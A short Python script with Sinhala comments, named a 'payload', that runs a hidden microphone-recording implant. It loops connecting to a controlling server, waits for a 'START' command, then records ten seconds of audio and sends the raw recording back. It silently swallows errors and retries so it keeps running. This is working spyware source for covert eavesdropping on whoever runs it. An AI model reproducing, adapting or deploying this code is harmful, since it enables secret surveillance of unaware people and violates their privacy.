import socket
import sounddevice as sd
import time

SERVER_IP = '127.0.0.1' 
PORT = 65432

def run_payload():
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(10)
                s.connect((SERVER_IP, PORT))
                
                # Receiver එකෙන් කරන නියෝගය ලබාගැනීම
                command = s.recv(1024).decode()
                
                if command == "START":
                    # තත්පර 10ක් record කිරීම
                    fs = 44100
                    duration = 10
                    rec = sd.rec(int(duration * fs), samplerate=fs, channels=1, dtype='int16')
                    sd.wait()
                    s.sendall(rec.tobytes())
                else:
                    # නියෝගයක් නැත්නම් තත්පර 5ක් නිහඬව සිටීම
                    time.sleep(5)
        except:
            time.sleep(10) # Server එක connect වීමට නොහැකි නම්

if __name__ == "__main__":
    run_payload()